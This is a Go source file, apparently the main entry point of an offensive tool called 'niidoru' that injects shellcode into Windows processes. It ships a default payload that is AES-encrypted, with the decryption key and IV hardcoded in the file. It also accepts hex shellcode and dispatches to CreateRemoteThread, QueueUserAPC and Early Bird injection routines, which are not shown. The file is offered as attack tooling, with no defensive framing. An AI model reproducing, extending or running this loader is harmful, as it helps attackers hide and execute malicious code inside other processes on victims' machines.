package main

import "fmt"
import "flag"
import "strings"
import "encoding/hex"


func main() {
   var process_name string;
   var hex_payload string;
   flag.StringVar(&process_name, "n", "", "Process name")
   var payload_str string = GetAESDecrypted_aux("BbZNVwAr3ErnvDSnfcgX70AiGN6QQ+JvU2btTCYZzxzyaw4Y3eqb1hFKzBmDwaKX4KMkddU0s++RZV9l4FywSodtuZiS94Ekic3y7f5xpykS134W6D0dpyUAQBmneB7s/v25yCnAWcJMSkL10FvDMTjL1futJWMkkMoDsyGV5PVuNAp4zyMhTNrRLjej6RHdwcokIpBBEgPwZWFhNWLOpldKT29f589Z3sURW2HowiEJwZb1q89K92vND6fIGlyr+TdaCwjKpE23q2dO+/stSTb2lW6c52yiK38TBcNlGRE=", "N33dl3N33dl3N33dl3N33dl3N33dl333", "N33dl3N33dl3N33d")
   flag.StringVar(&hex_payload, "h", payload_str, "Hexadecimal payload")
   pid :=  flag.Int("p", 0, "Process ID (PID)")
   method :=  flag.Int("m", 0, "Method for injection")
   flag.Parse()

   hex_payload = strings.Replace(hex_payload, "\\x", "", -1);
   payload, payloadErr := hex.DecodeString(hex_payload)
   if payloadErr != nil {
      fmt.Println("[-] Error decoding hexadecimal payload: %s", payloadErr.Error());
   }

   switch *method{
      case 1:
         CreateRemoteThread_Injection(process_name, *pid, payload)
      case 2:
         QueueUserAPC_Injection(process_name, *pid, payload);
      case 3:
         Earlybird_Injection(process_name, payload);
      default:
         fmt.Println("[+] niidoru.exe -m <METHOD> [ -p <PID> | -n <PROCESS_NAME> ] [ -h HEXADECIMAL_PAYLOAD ]");
   }
}